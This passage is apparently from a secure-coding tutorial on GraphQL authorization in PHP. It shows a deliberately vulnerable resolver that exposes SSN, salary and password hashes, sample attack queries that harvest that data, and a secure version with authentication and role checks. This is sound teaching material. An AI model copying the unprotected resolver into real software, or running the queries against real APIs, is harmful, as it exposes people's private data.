- **Per-endpoint CORS**: Apply stricter CORS to sensitive endpoints, more permissive for public APIs
- **Request ID tracing**: Correlate CORS violations with other security events
- **Credential scoping**: Never use `credentials: true` with public endpoints

GraphQL authorization is particularly tricky because the flexible query nature allows attackers to craft queries that bypass traditional access controls. Let me show you a common vulnerability and the secure approach.

**VULNERABLE CODE**:

```php
<?php
require_once 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Definition\ObjectType;
use GraphQL\Type\Definition\Type;
use GraphQL\Type\Schema;

class UserResolver {
    private $pdo;

    public function __construct($pdo) {
        $this->pdo = $pdo;
    }

    // VULNERABLE: No authorization check on resolver
    public function getUser($rootValue, $args) {
        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE id = ?");
        $stmt->execute([$args['id']]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }

    // VULNERABLE: Returns all users without authorization
    public function getAllUsers() {
        $stmt = $this->pdo->query("SELECT * FROM users");
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
}

$userType = new ObjectType([
    'name' => 'User',
    'fields' => [
        'id' => Type::int(),
        'email' => Type::string(),
        'ssn' => Type::string(),  // VULNERABLE: Sensitive field exposed
        'salary' => Type::float(), // VULNERABLE: No field-level auth
        'password_hash' => Type::string() // CRITICAL: Never expose!
    ]
]);

$queryType = new ObjectType([
    'name' => 'Query',
    'fields' => [
        'user' => [
            'type' => $userType,
            'args' => ['id' => Type::int()],
            'resolve' => [$resolver, 'getUser']
        ],
        'users' => [
            'type' => Type::listOf($userType),
            'resolve' => [$resolver, 'getAllUsers']
        ]
    ]
]);
```

**Attack Payload**:
```graphql
# Attacker queries any user's sensitive data
query {
  user(id: 1) {
    id
    email
    ssn
    salary
    password_hash
  }
}

# Or batch query all users
query {
  users {
    id
    email
    ssn
    salary
  }
}
```

**Why This Is Dangerous**:
- No authentication check before resolver execution
- Any user can access any other user's data via IDOR
- Sensitive fields (SSN, salary, password_hash) exposed without field-level authorization
- Batch queries allow mass data exfiltration
- No query depth/complexity limits enable DoS attacks

**SECURE VERSION**:

```php
<?php
require_once 'vendor/autoload.php';

use GraphQL\GraphQL;
use GraphQL\Type\Definition\ObjectType;
use GraphQL\Type\Definition\Type;
use GraphQL\Type\Definition\ResolveInfo;
use GraphQL\Type\Schema;
use GraphQL\Error\UserError;

class AuthContext {
    public $user;
    public $roles;

    public function __construct($userId, array $roles = []) {
        $this->user = $userId;
        $this->roles = $roles;
    }

    public function isAuthenticated(): bool {
        return $this->user !== null;
    }

    public function hasRole(string $role): bool {
        return in_array($role, $this->roles, true);
    }

    public function canAccessUser(int $targetUserId): bool {
        // Users can only access their own data, or admins can access anyone
        return $this->user === $targetUserId || $this->hasRole('admin');
    }
}

class SecureUserResolver {
    private $pdo;

    public function __construct($pdo) {
        $this->pdo = $pdo;
    }

    public function getUser($rootValue, $args, AuthContext $context, ResolveInfo $info) {
        // SECURITY: Require authentication
        if (!$context->isAuthenticated()) {
            throw new UserError('Authentication required');
        }

        // SECURITY: Authorization check - user can only access own data
        if (!$context->canAccessUser($args['id'])) {
            error_log(sprintf(
                "Authorization violation: User %d attempted to access user %d",
                $context->user,
                $args['id']
            ));
            throw new UserError('Access denied');
        }

        $stmt = $this->pdo->prepare("SELECT id, email, name FROM users WHERE id = ?");
        $stmt->execute([$args['id']]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }

    public function getAllUsers($rootValue, $args, AuthContext $context) {
        // SECURITY: Only admins can list all users
        if (!$context->hasRole('admin')) {
            throw new UserError('Admin access required');
        }

        $stmt = $this->pdo->query("SELECT id, email, name FROM users LIMIT 100");
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
}

